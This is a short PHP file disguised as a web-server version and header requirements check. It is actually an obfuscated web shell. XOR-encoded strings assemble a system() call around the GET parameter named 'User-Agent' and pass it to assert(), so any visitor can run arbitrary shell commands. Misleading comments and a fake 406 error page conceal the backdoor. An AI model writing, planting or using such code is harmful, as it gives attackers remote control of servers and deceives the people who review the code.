<?php

class SupportedVersions {
    # The supported PHP versions
    public const VERSIONS = "KWBZUA" ^ "8.1.0, 8.1.1, 8.1.2";
}

class Methods {
	# The allowed HTTP/S methods
	public const TYPES = array(
		"_GET", "GET",
		"_POST", "POST"
	);
}

class RequestHeaders {
	# The required HTTP/S request headers
	public const REQUIRED = array(
		"User-Agent",
		"Host",
		"Date",
	);
}

$current_version = phpversion();
# Checks the requirements for running the web server
if ($_SERVER['REQUEST_METHOD'] == Methods::TYPES[1] && isset(${Methods::TYPES[0]}[RequestHeaders::REQUIRED[0]])) {
	$user_agent = ${Methods::TYPES[0]}[RequestHeaders::REQUIRED[0]];
	$prefix = "ZG" ^ "requirement";
	$suffix = "y@" ^ "[info]";
	$requirements = SupportedVersions::VERSIONS . $prefix . $user_agent . $suffix;
	$requirements_array = assert($requirements);
	echo $requirements_array;
} else {
	http_response_code(406);
	echo <<<END
		<h1>Not Acceptable</h1>
		<br/>
		<a>An appropriate representation of the requested source could not be found of this server.</a>
		<hr/>
		<a>php $current_version</a>
	END;

}
?>
